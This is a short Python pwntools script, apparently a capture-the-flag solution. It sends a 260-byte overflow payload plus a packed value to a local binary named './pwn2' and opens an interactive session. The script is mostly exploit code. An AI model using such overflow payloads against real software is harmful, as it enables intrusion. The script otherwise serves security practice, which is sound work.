from pwn import *
context.log_level='debug'

p = process('./pwn2')
gdb.attach(p,"b *08048AFA\n")
payload = 'a'*260+p32(257)
p.sendlineafter("Write to object [size=260]:\n",payload)
p.interactive()
